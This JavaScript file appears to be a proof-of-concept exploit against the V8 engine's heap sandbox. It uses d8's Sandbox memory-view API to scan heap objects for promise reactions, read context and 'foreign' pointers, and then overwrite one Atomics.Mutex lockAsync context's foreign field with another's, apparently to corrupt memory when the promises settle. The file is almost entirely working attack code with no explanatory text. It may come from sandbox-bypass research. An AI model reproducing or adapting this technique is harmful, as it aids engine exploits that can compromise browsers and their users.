function findForeign(start_addr, max_objects = 35) {
  const tasks = [];
  let addr = start_addr;
  for (let i = 0; i < max_objects; i++) {
    let size = Sandbox.getSizeOfObjectAt(addr);
    objtype = Sandbox.getInstanceTypeOfObjectAt(addr)
    print(objtype + " at 0x" + (addr+1+Sandbox.base).toString(16));
    if(objtype == "PROMISE_REACTION_TYPE"){
      print("====================================")
      reject_handler = r32(addr+12);
      print("reject_handler: 0x" + (reject_handler+Sandbox.base).toString(16));
      context = r32(reject_handler-1+20);
      print("context: 0x" + (context+Sandbox.base).toString(16));
      foreign = r32(context-1+24);
      print("foreign: 0x" + (foreign+Sandbox.base).toString(16));
      tasks.push(context-1);
      print("content of foreign: 0x"+ r32(foreign-1).toString(16));
      print("====================================")
    }
    addr = (addr + size) >>> 0;
  }
  return tasks;
}
const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

const r32 = (addr) => mem.getUint32(addr, true);
const w32 = (addr, val) => mem.setUint32(addr, val, true);

oo={};
(async () => {
  const m1 = new Atomics.Mutex();
  //const m2 = new Atomics.Mutex();
  const p1 = Atomics.Mutex.lockAsync(m1, () => 1);
  const p2 = Atomics.Mutex.lockAsync(m1, () => 2);

  tasks = findForeign(Sandbox.getAddressOf(oo));
  
  w32(tasks[0]+24, r32(tasks[2]+24));

  await Promise.allSettled([p1, p2]);
})();


